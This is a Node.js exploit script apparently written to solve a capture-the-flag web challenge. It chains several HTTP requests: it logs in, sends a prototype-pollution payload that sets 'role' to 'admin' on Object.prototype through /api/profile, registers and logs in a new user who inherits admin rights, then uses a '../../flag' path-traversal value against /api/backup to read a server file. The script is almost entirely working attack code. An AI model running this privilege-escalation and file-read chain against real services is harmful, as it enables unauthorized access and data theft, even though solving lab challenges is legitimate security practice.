
const http = require('http');

// Step 1: Login existing user, then call /api/profile with poison payload
// We'll use one of our existing users to do this
const existingUid = "b050bd44d7a04038b2363d3d9c153b32";

const querystring = require('querystring');
const loginPost = querystring.stringify({ uid: existingUid });

const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginPost)
  }
};

console.log("Step 1: Login existing user...");
const loginReq = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("Step 2: Poison prototype via /api/profile...");
  
  // Poison payload here: when merged, it pollutes Object.prototype
  const poisonData = JSON.stringify({
    "uid": existingUid,
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });
  
  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonData),
      'Cookie': cookie
    }
  };
  
  const poisonReq = http.request(poisonOpts, (poisonRes) => {
    let body = '';
    poisonRes.on('data', chunk => body += chunk);
    poisonRes.on('end', () => {
      console.log("✅ Prototype poisoned! Now register new user...");
      // Step 3: Register new user, it will inherit role: admin from prototype
      registerNewUser(cookie);
    });
  });
  poisonReq.write(poisonData);
  poisonReq.end();
});

loginReq.on('error', err => console.error(err));
loginReq.write(loginPost);
loginReq.end();

function registerNewUser(cookie) {
  const querystring = require('querystring');
  const postData = querystring.stringify({
    "username": "finalfinal"
  });
  
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/register',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(opts, (res) => {
    let regBody = '';
    res.on('data', chunk => regBody += chunk);
    res.on('end', () => {
      const match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
      if (match) {
        const uid = match[1];
        console.log(`✅ Registered new user, UID: ${uid}`);
        console.log("Step 4: Login new user...");
        loginNewUser(uid);
      } else {
        console.log("❌ Failed to get UID");
        console.log(regBody);
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function loginNewUser(uid) {
  const querystring = require('querystring');
  const postData = querystring.stringify({ uid: uid });
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(opts, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    console.log("✅ Logged in, check profile...");
    checkProfile(uid, cookie);
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function checkProfile(uid, cookie) {
  const profileData = JSON.stringify({ uid: uid });
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(profileData),
      'Cookie': cookie
    }
  };

  const req = http.request(opts, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\nProfile response:");
      console.log(body);
      try {
        const json = JSON.parse(body);
        console.log("\nParsed:");
        console.log(JSON.stringify(json, null, 2));
        console.log("\nRole:", json.role);
        if (json.role === 'admin') {
          console.log("\n🎉 GOT ADMIN! Getting flag...");
          requestBackup(cookie);
        } else {
          console.log("\n❌ Still not admin");
        }
      } catch(e) {
        console.log("JSON parse error", e);
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(profileData);
  req.end();
}

function requestBackup(cookie) {
  const querystring = require('querystring');
  const postData = querystring.stringify({ file: '../../flag' });
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/backup',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData),
      'Cookie': cookie
    }
  };

  const req = http.request(opts, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\n🏁 FINAL RESULT:");
      console.log(body);
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}
